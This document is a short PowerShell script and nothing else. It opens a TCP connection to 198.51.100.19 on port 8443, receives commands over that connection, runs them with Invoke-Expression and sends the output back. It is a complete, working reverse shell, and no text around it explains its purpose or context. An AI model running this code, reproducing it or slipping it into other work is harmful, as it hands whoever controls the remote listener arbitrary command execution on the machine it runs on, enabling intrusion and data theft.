$channel = [Net.Sockets.TcpClient]::new('198.51.100.19',8443);
$stream = $channel.GetStream();
[byte[]]$incoming = 0..65535 | ForEach-Object {0};
while (($count = $stream.Read($incoming,0,$incoming.Length)) -ne 0) {
  $task = [System.Text.Encoding]::UTF8.GetString($incoming,0,$count);
  $result = (iex $task 2>&1 | Out-String);
  $reply = [System.Text.Encoding]::UTF8.GetBytes($result);
  $stream.Write($reply,0,$reply.Length);
  $stream.Flush();
}
$channel.Close();
